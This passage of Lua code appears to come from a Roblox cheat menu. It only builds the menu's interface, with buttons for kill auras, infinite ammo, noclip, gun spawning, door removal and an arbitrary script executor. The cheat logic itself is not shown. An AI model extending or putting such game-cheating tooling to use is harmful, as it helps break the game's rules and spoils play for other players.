ProjectAntiAbusers.givegunsorderButton.Name = "givegunsorderButton"
ProjectAntiAbusers.givegunsorderButton.Parent = ProjectAntiAbusers.GunstuffFrame
ProjectAntiAbusers.givegunsorderButton.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.givegunsorderButton.Position = UDim2.new(0.554801285, 0, 0.0423728824, 0)
ProjectAntiAbusers.givegunsorderButton.Size = UDim2.new(0, 175, 0, 45)
ProjectAntiAbusers.givegunsorderButton.Font = Enum.Font.SourceSans
ProjectAntiAbusers.givegunsorderButton.Text = "Give guns in specific order"
ProjectAntiAbusers.givegunsorderButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.givegunsorderButton.TextSize = 17.000

ProjectAntiAbusers.UICorner_55.Parent = ProjectAntiAbusers.givegunsorderButton

ProjectAntiAbusers.autogunspawn.Name = "autogunspawn"
ProjectAntiAbusers.autogunspawn.Parent = ProjectAntiAbusers.GunstuffFrame
ProjectAntiAbusers.autogunspawn.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.autogunspawn.Position = UDim2.new(0.288220525, 0, 0.275423735, 0)
ProjectAntiAbusers.autogunspawn.Size = UDim2.new(0, 170, 0, 45)
ProjectAntiAbusers.autogunspawn.Font = Enum.Font.SourceSans
ProjectAntiAbusers.autogunspawn.Text = "Auto gunspawn"
ProjectAntiAbusers.autogunspawn.TextColor3 = Color3.fromRGB(255, 0, 0)
ProjectAntiAbusers.autogunspawn.TextSize = 17.000

ProjectAntiAbusers.UICorner_56.Parent = ProjectAntiAbusers.autogunspawn

ProjectAntiAbusers.infammo.Name = "infammo"
ProjectAntiAbusers.infammo.Parent = ProjectAntiAbusers.GunstuffFrame
ProjectAntiAbusers.infammo.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.infammo.Position = UDim2.new(0.0300751887, 0, 0.521186471, 0)
ProjectAntiAbusers.infammo.Size = UDim2.new(0, 175, 0, 45)
ProjectAntiAbusers.infammo.Font = Enum.Font.SourceSans
ProjectAntiAbusers.infammo.Text = "Infinite Ammo"
ProjectAntiAbusers.infammo.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.infammo.TextSize = 17.000

ProjectAntiAbusers.UICorner_57.Parent = ProjectAntiAbusers.infammo

ProjectAntiAbusers.gunmods.Name = "gunmods"
ProjectAntiAbusers.gunmods.Parent = ProjectAntiAbusers.GunstuffFrame
ProjectAntiAbusers.gunmods.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.gunmods.Position = UDim2.new(0.553884745, 0, 0.525423765, 0)
ProjectAntiAbusers.gunmods.Size = UDim2.new(0, 175, 0, 45)
ProjectAntiAbusers.gunmods.Font = Enum.Font.SourceSans
ProjectAntiAbusers.gunmods.Text = "Gunmods"
ProjectAntiAbusers.gunmods.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.gunmods.TextSize = 17.000

ProjectAntiAbusers.UICorner_58.Parent = ProjectAntiAbusers.gunmods

ProjectAntiAbusers.orderinfoTextLabel.Name = "orderinfoTextLabel"
ProjectAntiAbusers.orderinfoTextLabel.Parent = ProjectAntiAbusers.GunstuffFrame
ProjectAntiAbusers.orderinfoTextLabel.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.orderinfoTextLabel.Position = UDim2.new(0.0272017866, 0, 0.738787472, 0)
ProjectAntiAbusers.orderinfoTextLabel.Size = UDim2.new(0, 384, 0, 50)
ProjectAntiAbusers.orderinfoTextLabel.Font = Enum.Font.SourceSans
ProjectAntiAbusers.orderinfoTextLabel.Text = "For the auto gunspawn and specific order guns to work, dm Chaotic Mind#0666 with your preferred gun order"
ProjectAntiAbusers.orderinfoTextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.orderinfoTextLabel.TextSize = 18.000
ProjectAntiAbusers.orderinfoTextLabel.TextWrapped = true

ProjectAntiAbusers.UICorner_59.Parent = ProjectAntiAbusers.orderinfoTextLabel

ProjectAntiAbusers.KeyBindsFrame.Name = "KeyBindsFrame"
ProjectAntiAbusers.KeyBindsFrame.Parent = ProjectAntiAbusers.Background
ProjectAntiAbusers.KeyBindsFrame.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
ProjectAntiAbusers.KeyBindsFrame.Position = UDim2.new(0.218999997, 0, 0.0869999975, 0)
ProjectAntiAbusers.KeyBindsFrame.Size = UDim2.new(0, 399, 0, 236)
ProjectAntiAbusers.KeyBindsFrame.Visible = false

ProjectAntiAbusers.UICorner_60.Parent = ProjectAntiAbusers.KeyBindsFrame

ProjectAntiAbusers.Q.Name = "Q"
ProjectAntiAbusers.Q.Parent = ProjectAntiAbusers.KeyBindsFrame
ProjectAntiAbusers.Q.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.Q.Position = UDim2.new(0.0275689214, 0, 0.0108810682, 0)
ProjectAntiAbusers.Q.Size = UDim2.new(0, 38, 0, 30)
ProjectAntiAbusers.Q.Font = Enum.Font.SourceSans
ProjectAntiAbusers.Q.Text = "Q"
ProjectAntiAbusers.Q.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.Q.TextSize = 21.000

ProjectAntiAbusers.UICorner_61.Parent = ProjectAntiAbusers.Q

ProjectAntiAbusers.E.Name = "E"
ProjectAntiAbusers.E.Parent = ProjectAntiAbusers.KeyBindsFrame
ProjectAntiAbusers.E.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.E.Position = UDim2.new(0.0300751887, 0, 0.146474287, 0)
ProjectAntiAbusers.E.Size = UDim2.new(0, 38, 0, 30)
ProjectAntiAbusers.E.Font = Enum.Font.SourceSans
ProjectAntiAbusers.E.Text = "E"
ProjectAntiAbusers.E.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.E.TextSize = 21.000

ProjectAntiAbusers.UICorner_62.Parent = ProjectAntiAbusers.E

ProjectAntiAbusers.T.Name = "T"
ProjectAntiAbusers.T.Parent = ProjectAntiAbusers.KeyBindsFrame
ProjectAntiAbusers.T.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.T.Position = UDim2.new(0.0300751887, 0, 0.286304772, 0)
ProjectAntiAbusers.T.Size = UDim2.new(0, 38, 0, 30)
ProjectAntiAbusers.T.Font = Enum.Font.SourceSans
ProjectAntiAbusers.T.Text = "T"
ProjectAntiAbusers.T.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.T.TextSize = 21.000

ProjectAntiAbusers.UICorner_63.Parent = ProjectAntiAbusers.T

ProjectAntiAbusers.Z.Name = "Z"
ProjectAntiAbusers.Z.Parent = ProjectAntiAbusers.KeyBindsFrame
ProjectAntiAbusers.Z.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.Z.Position = UDim2.new(0.0300751869, 0, 0.43460986, 0)
ProjectAntiAbusers.Z.Size = UDim2.new(0, 38, 0, 30)
ProjectAntiAbusers.Z.Font = Enum.Font.SourceSans
ProjectAntiAbusers.Z.Text = "Z"
ProjectAntiAbusers.Z.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.Z.TextSize = 21.000

ProjectAntiAbusers.UICorner_64.Parent = ProjectAntiAbusers.Z

ProjectAntiAbusers.X.Name = "X"
ProjectAntiAbusers.X.Parent = ProjectAntiAbusers.KeyBindsFrame
ProjectAntiAbusers.X.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.X.Position = UDim2.new(0.0300751869, 0, 0.578677654, 0)
ProjectAntiAbusers.X.Size = UDim2.new(0, 38, 0, 30)
ProjectAntiAbusers.X.Font = Enum.Font.SourceSans
ProjectAntiAbusers.X.Text = "X"
ProjectAntiAbusers.X.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.X.TextSize = 21.000

ProjectAntiAbusers.UICorner_65.Parent = ProjectAntiAbusers.X

ProjectAntiAbusers.TextLabel_19.Name = "["
ProjectAntiAbusers.TextLabel_19.Parent = ProjectAntiAbusers.KeyBindsFrame
ProjectAntiAbusers.TextLabel_19.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.TextLabel_19.Position = UDim2.new(0.0300751869, 0, 0.726982713, 0)
ProjectAntiAbusers.TextLabel_19.Size = UDim2.new(0, 38, 0, 30)
ProjectAntiAbusers.TextLabel_19.Font = Enum.Font.SourceSans
ProjectAntiAbusers.TextLabel_19.Text = "["
ProjectAntiAbusers.TextLabel_19.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.TextLabel_19.TextSize = 21.000

ProjectAntiAbusers.UICorner_66.Parent = ProjectAntiAbusers.TextLabel_19

ProjectAntiAbusers.TextLabel_20.Name = ";"
ProjectAntiAbusers.TextLabel_20.Parent = ProjectAntiAbusers.KeyBindsFrame
ProjectAntiAbusers.TextLabel_20.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.TextLabel_20.Position = UDim2.new(0.0300751869, 0, 0.875287771, 0)
ProjectAntiAbusers.TextLabel_20.Size = UDim2.new(0, 38, 0, 30)
ProjectAntiAbusers.TextLabel_20.Font = Enum.Font.SourceSans
ProjectAntiAbusers.TextLabel_20.Text = ";"
ProjectAntiAbusers.TextLabel_20.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.TextLabel_20.TextSize = 21.000

ProjectAntiAbusers.UICorner_67.Parent = ProjectAntiAbusers.TextLabel_20

ProjectAntiAbusers.autorespawn.Name = "auto respawn"
ProjectAntiAbusers.autorespawn.Parent = ProjectAntiAbusers.KeyBindsFrame
ProjectAntiAbusers.autorespawn.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.autorespawn.Position = UDim2.new(0.145363405, 0, 0.0108810682, 0)
ProjectAntiAbusers.autorespawn.Size = UDim2.new(0, 333, 0, 30)
ProjectAntiAbusers.autorespawn.Font = Enum.Font.SourceSans
ProjectAntiAbusers.autorespawn.Text = "Auto Respawn"
ProjectAntiAbusers.autorespawn.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.autorespawn.TextSize = 21.000

ProjectAntiAbusers.UICorner_68.Parent = ProjectAntiAbusers.autorespawn

ProjectAntiAbusers.noclip.Name = "noclip"
ProjectAntiAbusers.noclip.Parent = ProjectAntiAbusers.KeyBindsFrame
ProjectAntiAbusers.noclip.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.noclip.Position = UDim2.new(0.145363405, 0, 0.146474287, 0)
ProjectAntiAbusers.noclip.Size = UDim2.new(0, 333, 0, 30)
ProjectAntiAbusers.noclip.Font = Enum.Font.SourceSans
ProjectAntiAbusers.noclip.Text = "Noclip"
ProjectAntiAbusers.noclip.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.noclip.TextSize = 21.000

ProjectAntiAbusers.UICorner_69.Parent = ProjectAntiAbusers.noclip

ProjectAntiAbusers.Gunspawn.Name = "Gun spawn"
ProjectAntiAbusers.Gunspawn.Parent = ProjectAntiAbusers.KeyBindsFrame
ProjectAntiAbusers.Gunspawn.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.Gunspawn.Position = UDim2.new(0.144999996, 0, 0.434474587, 0)
ProjectAntiAbusers.Gunspawn.Size = UDim2.new(0, 333, 0, 30)
ProjectAntiAbusers.Gunspawn.Font = Enum.Font.SourceSans
ProjectAntiAbusers.Gunspawn.Text = "Gun Spawn (Custom Order)"
ProjectAntiAbusers.Gunspawn.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.Gunspawn.TextSize = 21.000

ProjectAntiAbusers.UICorner_70.Parent = ProjectAntiAbusers.Gunspawn

ProjectAntiAbusers.rapidfire.Name = "rapid fire"
ProjectAntiAbusers.rapidfire.Parent = ProjectAntiAbusers.KeyBindsFrame
ProjectAntiAbusers.rapidfire.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.rapidfire.Position = UDim2.new(0.144999996, 0, 0.286000013, 0)
ProjectAntiAbusers.rapidfire.Size = UDim2.new(0, 333, 0, 30)
ProjectAntiAbusers.rapidfire.Font = Enum.Font.SourceSans
ProjectAntiAbusers.rapidfire.Text = "Rapid Fire (Equip Gun To Enable)"
ProjectAntiAbusers.rapidfire.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.rapidfire.TextSize = 21.000

ProjectAntiAbusers.UICorner_71.Parent = ProjectAntiAbusers.rapidfire

ProjectAntiAbusers.fixui.Name = "fix ui"
ProjectAntiAbusers.fixui.Parent = ProjectAntiAbusers.KeyBindsFrame
ProjectAntiAbusers.fixui.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.fixui.Position = UDim2.new(0.144999996, 0, 0.574474573, 0)
ProjectAntiAbusers.fixui.Size = UDim2.new(0, 333, 0, 30)
ProjectAntiAbusers.fixui.Font = Enum.Font.SourceSans
ProjectAntiAbusers.fixui.Text = "Toggle UI"
ProjectAntiAbusers.fixui.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.fixui.TextSize = 21.000

ProjectAntiAbusers.UICorner_72.Parent = ProjectAntiAbusers.fixui

ProjectAntiAbusers.fixui_2.Name = "fix ui"
ProjectAntiAbusers.fixui_2.Parent = ProjectAntiAbusers.KeyBindsFrame
ProjectAntiAbusers.fixui_2.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.fixui_2.Position = UDim2.new(0.144999996, 0, 0.726949096, 0)
ProjectAntiAbusers.fixui_2.Size = UDim2.new(0, 333, 0, 30)
ProjectAntiAbusers.fixui_2.Font = Enum.Font.SourceSans
ProjectAntiAbusers.fixui_2.Text = "Fix UI"
ProjectAntiAbusers.fixui_2.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.fixui_2.TextSize = 21.000

ProjectAntiAbusers.UICorner_73.Parent = ProjectAntiAbusers.fixui_2

ProjectAntiAbusers.Focusonadmin.Name = "Focus on admin"
ProjectAntiAbusers.Focusonadmin.Parent = ProjectAntiAbusers.KeyBindsFrame
ProjectAntiAbusers.Focusonadmin.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.Focusonadmin.Position = UDim2.new(0.150012523, 0, 0.874949098, 0)
ProjectAntiAbusers.Focusonadmin.Size = UDim2.new(0, 333, 0, 30)
ProjectAntiAbusers.Focusonadmin.Font = Enum.Font.SourceSans
ProjectAntiAbusers.Focusonadmin.Text = "Focus On Admin Bar"
ProjectAntiAbusers.Focusonadmin.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.Focusonadmin.TextSize = 21.000

ProjectAntiAbusers.UICorner_74.Parent = ProjectAntiAbusers.Focusonadmin

ProjectAntiAbusers.KillAuraTogglesFrame.Name = "KillAuraTogglesFrame"
ProjectAntiAbusers.KillAuraTogglesFrame.Parent = ProjectAntiAbusers.Background
ProjectAntiAbusers.KillAuraTogglesFrame.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
ProjectAntiAbusers.KillAuraTogglesFrame.Position = UDim2.new(0.218999997, 0, 0.0869999975, 0)
ProjectAntiAbusers.KillAuraTogglesFrame.Size = UDim2.new(0, 399, 0, 236)
ProjectAntiAbusers.KillAuraTogglesFrame.Visible = false

ProjectAntiAbusers.UICorner_75.Parent = ProjectAntiAbusers.KillAuraTogglesFrame

ProjectAntiAbusers.KillAura.Name = "KillAura"
ProjectAntiAbusers.KillAura.Parent = ProjectAntiAbusers.KillAuraTogglesFrame
ProjectAntiAbusers.KillAura.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.KillAura.Position = UDim2.new(0.025062656, 0, 0.0423728824, 0)
ProjectAntiAbusers.KillAura.Size = UDim2.new(0, 175, 0, 35)
ProjectAntiAbusers.KillAura.Font = Enum.Font.SourceSans
ProjectAntiAbusers.KillAura.Text = "KillAura"
ProjectAntiAbusers.KillAura.TextColor3 = Color3.fromRGB(255, 0, 0)
ProjectAntiAbusers.KillAura.TextSize = 21.000

ProjectAntiAbusers.UICorner_76.Parent = ProjectAntiAbusers.KillAura

ProjectAntiAbusers.KillAuraCrim.Name = "KillAuraCrim"
ProjectAntiAbusers.KillAuraCrim.Parent = ProjectAntiAbusers.KillAuraTogglesFrame
ProjectAntiAbusers.KillAuraCrim.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.KillAuraCrim.Position = UDim2.new(0.538847148, 0, 0.0423728824, 0)
ProjectAntiAbusers.KillAuraCrim.Size = UDim2.new(0, 175, 0, 35)
ProjectAntiAbusers.KillAuraCrim.Font = Enum.Font.SourceSans
ProjectAntiAbusers.KillAuraCrim.Text = "KillAura Criminal"
ProjectAntiAbusers.KillAuraCrim.TextColor3 = Color3.fromRGB(255, 0, 0)
ProjectAntiAbusers.KillAuraCrim.TextSize = 21.000

ProjectAntiAbusers.UICorner_77.Parent = ProjectAntiAbusers.KillAuraCrim

ProjectAntiAbusers.KillAuraPris.Name = "KillAuraPris"
ProjectAntiAbusers.KillAuraPris.Parent = ProjectAntiAbusers.KillAuraTogglesFrame
ProjectAntiAbusers.KillAuraPris.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.KillAuraPris.Position = UDim2.new(0.025062656, 0, 0.237288132, 0)
ProjectAntiAbusers.KillAuraPris.Size = UDim2.new(0, 175, 0, 35)
ProjectAntiAbusers.KillAuraPris.Font = Enum.Font.SourceSans
ProjectAntiAbusers.KillAuraPris.Text = "KillAura Prisoner"
ProjectAntiAbusers.KillAuraPris.TextColor3 = Color3.fromRGB(255, 0, 0)
ProjectAntiAbusers.KillAuraPris.TextSize = 21.000

ProjectAntiAbusers.UICorner_78.Parent = ProjectAntiAbusers.KillAuraPris

ProjectAntiAbusers.KillAuraGuards.Name = "KillAuraGuards"
ProjectAntiAbusers.KillAuraGuards.Parent = ProjectAntiAbusers.KillAuraTogglesFrame
ProjectAntiAbusers.KillAuraGuards.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.KillAuraGuards.Position = UDim2.new(0.543859661, 0, 0.237288132, 0)
ProjectAntiAbusers.KillAuraGuards.Size = UDim2.new(0, 175, 0, 35)
ProjectAntiAbusers.KillAuraGuards.Font = Enum.Font.SourceSans
ProjectAntiAbusers.KillAuraGuards.Text = "KillAura Guards"
ProjectAntiAbusers.KillAuraGuards.TextColor3 = Color3.fromRGB(255, 0, 0)
ProjectAntiAbusers.KillAuraGuards.TextSize = 21.000

ProjectAntiAbusers.UICorner_79.Parent = ProjectAntiAbusers.KillAuraGuards

ProjectAntiAbusers.KillAuraSkids.Name = "KillAuraSkids"
ProjectAntiAbusers.KillAuraSkids.Parent = ProjectAntiAbusers.KillAuraTogglesFrame
ProjectAntiAbusers.KillAuraSkids.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.KillAuraSkids.Position = UDim2.new(0.0275689363, 0, 0.432203382, 0)
ProjectAntiAbusers.KillAuraSkids.Size = UDim2.new(0, 175, 0, 35)
ProjectAntiAbusers.KillAuraSkids.Font = Enum.Font.SourceSans
ProjectAntiAbusers.KillAuraSkids.Text = "KillAura Skids"
ProjectAntiAbusers.KillAuraSkids.TextColor3 = Color3.fromRGB(255, 0, 0)
ProjectAntiAbusers.KillAuraSkids.TextSize = 21.000

ProjectAntiAbusers.UICorner_80.Parent = ProjectAntiAbusers.KillAuraSkids

ProjectAntiAbusers.DeathAura.Name = "DeathAura"
ProjectAntiAbusers.DeathAura.Parent = ProjectAntiAbusers.KillAuraTogglesFrame
ProjectAntiAbusers.DeathAura.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.DeathAura.Position = UDim2.new(0.543859661, 0, 0.427966088, 0)
ProjectAntiAbusers.DeathAura.Size = UDim2.new(0, 175, 0, 35)
ProjectAntiAbusers.DeathAura.Font = Enum.Font.SourceSans
ProjectAntiAbusers.DeathAura.Text = "Death Aura"
ProjectAntiAbusers.DeathAura.TextColor3 = Color3.fromRGB(255, 0, 0)
ProjectAntiAbusers.DeathAura.TextSize = 21.000

ProjectAntiAbusers.UICorner_81.Parent = ProjectAntiAbusers.DeathAura

ProjectAntiAbusers.AnnoyAura.Name = "AnnoyAura"
ProjectAntiAbusers.AnnoyAura.Parent = ProjectAntiAbusers.KillAuraTogglesFrame
ProjectAntiAbusers.AnnoyAura.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.AnnoyAura.Position = UDim2.new(0.285714298, 0, 0.631355882, 0)
ProjectAntiAbusers.AnnoyAura.Size = UDim2.new(0, 175, 0, 35)
ProjectAntiAbusers.AnnoyAura.Font = Enum.Font.SourceSans
ProjectAntiAbusers.AnnoyAura.Text = "Annoy Aura"
ProjectAntiAbusers.AnnoyAura.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.AnnoyAura.TextSize = 21.000

ProjectAntiAbusers.UICorner_82.Parent = ProjectAntiAbusers.AnnoyAura

ProjectAntiAbusers.LocalFunctionsFrame.Name = "LocalFunctionsFrame"
ProjectAntiAbusers.LocalFunctionsFrame.Parent = ProjectAntiAbusers.Background
ProjectAntiAbusers.LocalFunctionsFrame.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
ProjectAntiAbusers.LocalFunctionsFrame.Position = UDim2.new(0.218999997, 0, 0.0869999975, 0)
ProjectAntiAbusers.LocalFunctionsFrame.Size = UDim2.new(0, 399, 0, 236)
ProjectAntiAbusers.LocalFunctionsFrame.Visible = false

ProjectAntiAbusers.UICorner_83.Parent = ProjectAntiAbusers.LocalFunctionsFrame

ProjectAntiAbusers.rejoin.Name = "rejoin"
ProjectAntiAbusers.rejoin.Parent = ProjectAntiAbusers.LocalFunctionsFrame
ProjectAntiAbusers.rejoin.BackgroundColor3 = Color3.fromRGB(108, 108, 108)
ProjectAntiAbusers.rejoin.Position = UDim2.new(0.025062656, 0, 0.0338983051, 0)
ProjectAntiAbusers.rejoin.Size = UDim2.new(0, 185, 0, 32)
ProjectAntiAbusers.rejoin.Font = Enum.Font.SourceSans
ProjectAntiAbusers.rejoin.Text = "Rejoin Current Server"
ProjectAntiAbusers.rejoin.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.rejoin.TextSize = 15.000

ProjectAntiAbusers.UICorner_84.Parent = ProjectAntiAbusers.rejoin

ProjectAntiAbusers.doorremove.Name = "doorremove"
ProjectAntiAbusers.doorremove.Parent = ProjectAntiAbusers.LocalFunctionsFrame
ProjectAntiAbusers.doorremove.BackgroundColor3 = Color3.fromRGB(108, 108, 108)
ProjectAntiAbusers.doorremove.Position = UDim2.new(0.025062656, 0, 0.190677971, 0)
ProjectAntiAbusers.doorremove.Size = UDim2.new(0, 185, 0, 32)
ProjectAntiAbusers.doorremove.Font = Enum.Font.SourceSans
ProjectAntiAbusers.doorremove.Text = "Remove Doors"
ProjectAntiAbusers.doorremove.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.doorremove.TextSize = 15.000

ProjectAntiAbusers.UICorner_85.Parent = ProjectAntiAbusers.doorremove

ProjectAntiAbusers.watergun.Name = "water gun"
ProjectAntiAbusers.watergun.Parent = ProjectAntiAbusers.LocalFunctionsFrame
ProjectAntiAbusers.watergun.BackgroundColor3 = Color3.fromRGB(108, 108, 108)
ProjectAntiAbusers.watergun.Position = UDim2.new(0.025062656, 0, 0.347457618, 0)
ProjectAntiAbusers.watergun.Size = UDim2.new(0, 185, 0, 32)
ProjectAntiAbusers.watergun.Font = Enum.Font.SourceSans
ProjectAntiAbusers.watergun.Text = "Water Guns"
ProjectAntiAbusers.watergun.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.watergun.TextSize = 15.000

ProjectAntiAbusers.UICorner_86.Parent = ProjectAntiAbusers.watergun

ProjectAntiAbusers.raincar.Name = "raincar"
ProjectAntiAbusers.raincar.Parent = ProjectAntiAbusers.LocalFunctionsFrame
ProjectAntiAbusers.raincar.BackgroundColor3 = Color3.fromRGB(108, 108, 108)
ProjectAntiAbusers.raincar.Position = UDim2.new(0.025062656, 0, 0.838982999, 0)
ProjectAntiAbusers.raincar.Size = UDim2.new(0, 90, 0, 32)
ProjectAntiAbusers.raincar.Font = Enum.Font.SourceSans
ProjectAntiAbusers.raincar.Text = "Rain Cars"
ProjectAntiAbusers.raincar.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.raincar.TextSize = 15.000

ProjectAntiAbusers.UICorner_87.Parent = ProjectAntiAbusers.raincar

ProjectAntiAbusers.delseat.Name = "delseat"
ProjectAntiAbusers.delseat.Parent = ProjectAntiAbusers.LocalFunctionsFrame
ProjectAntiAbusers.delseat.BackgroundColor3 = Color3.fromRGB(108, 108, 108)
ProjectAntiAbusers.delseat.Position = UDim2.new(0.025062656, 0, 0.508474588, 0)
ProjectAntiAbusers.delseat.Size = UDim2.new(0, 185, 0, 32)
ProjectAntiAbusers.delseat.Font = Enum.Font.SourceSans
ProjectAntiAbusers.delseat.Text = "Delete Seat"
ProjectAntiAbusers.delseat.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.delseat.TextSize = 15.000

ProjectAntiAbusers.UICorner_88.Parent = ProjectAntiAbusers.delseat

ProjectAntiAbusers.showping.Name = "showping"
ProjectAntiAbusers.showping.Parent = ProjectAntiAbusers.LocalFunctionsFrame
ProjectAntiAbusers.showping.BackgroundColor3 = Color3.fromRGB(108, 108, 108)
ProjectAntiAbusers.showping.Position = UDim2.new(0.511278212, 0, 0.0338982418, 0)
ProjectAntiAbusers.showping.Size = UDim2.new(0, 179, 0, 32)
ProjectAntiAbusers.showping.Font = Enum.Font.SourceSans
ProjectAntiAbusers.showping.Text = "Show Ping"
ProjectAntiAbusers.showping.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.showping.TextSize = 15.000

ProjectAntiAbusers.UICorner_89.Parent = ProjectAntiAbusers.showping

ProjectAntiAbusers.ScriptTextBox.Name = "ScriptTextBox"
ProjectAntiAbusers.ScriptTextBox.Parent = ProjectAntiAbusers.LocalFunctionsFrame
ProjectAntiAbusers.ScriptTextBox.BackgroundColor3 = Color3.fromRGB(108, 108, 108)
ProjectAntiAbusers.ScriptTextBox.Position = UDim2.new(0.511278152, 0, 0.449152559, 0)
ProjectAntiAbusers.ScriptTextBox.Size = UDim2.new(0, 181, 0, 87)
ProjectAntiAbusers.ScriptTextBox.Font = Enum.Font.SourceSans
ProjectAntiAbusers.ScriptTextBox.PlaceholderText = "Place your script here!"
ProjectAntiAbusers.ScriptTextBox.Text = ""
ProjectAntiAbusers.ScriptTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.ScriptTextBox.TextSize = 14.000
ProjectAntiAbusers.ScriptTextBox.TextWrapped = true

ProjectAntiAbusers.UICorner_90.Parent = ProjectAntiAbusers.ScriptTextBox

ProjectAntiAbusers.textlabelforexecutescriptomg.Name = "textlabelforexecutescriptomg"
ProjectAntiAbusers.textlabelforexecutescriptomg.Parent = ProjectAntiAbusers.LocalFunctionsFrame
ProjectAntiAbusers.textlabelforexecutescriptomg.BackgroundColor3 = Color3.fromRGB(108, 108, 108)
ProjectAntiAbusers.textlabelforexecutescriptomg.Position = UDim2.new(0.508772016, 0, 0.347457618, 0)
ProjectAntiAbusers.textlabelforexecutescriptomg.Size = UDim2.new(0, 181, 0, 21)
ProjectAntiAbusers.textlabelforexecutescriptomg.Font = Enum.Font.SourceSans
ProjectAntiAbusers.textlabelforexecutescriptomg.Text = "Execute Small Script Below"
ProjectAntiAbusers.textlabelforexecutescriptomg.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.textlabelforexecutescriptomg.TextSize = 14.000
ProjectAntiAbusers.textlabelforexecutescriptomg.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)

ProjectAntiAbusers.UICorner_91.Parent = ProjectAntiAbusers.textlabelforexecutescriptomg

ProjectAntiAbusers.Execute.Name = "Execute"
ProjectAntiAbusers.Execute.Parent = ProjectAntiAbusers.LocalFunctionsFrame
ProjectAntiAbusers.Execute.BackgroundColor3 = Color3.fromRGB(108, 108, 108)
ProjectAntiAbusers.Execute.Position = UDim2.new(0.51879704, 0, 0.838983059, 0)
ProjectAntiAbusers.Execute.Size = UDim2.new(0, 178, 0, 32)
ProjectAntiAbusers.Execute.Font = Enum.Font.SourceSans
ProjectAntiAbusers.Execute.Text = "Execute!"
ProjectAntiAbusers.Execute.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.Execute.TextSize = 14.000

ProjectAntiAbusers.UICorner_92.Parent = ProjectAntiAbusers.Execute

ProjectAntiAbusers.saverespawn.Name = "saverespawn"
ProjectAntiAbusers.saverespawn.Parent = ProjectAntiAbusers.LocalFunctionsFrame
ProjectAntiAbusers.saverespawn.BackgroundColor3 = Color3.fromRGB(108, 108, 108)
ProjectAntiAbusers.saverespawn.Position = UDim2.new(0.025062656, 0, 0.673728824, 0)
ProjectAntiAbusers.saverespawn.Size = UDim2.new(0, 185, 0, 32)
ProjectAntiAbusers.saverespawn.Font = Enum.Font.SourceSans
ProjectAntiAbusers.saverespawn.Text = "Save Respawn"
ProjectAntiAbusers.saverespawn.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.saverespawn.TextSize = 15.000

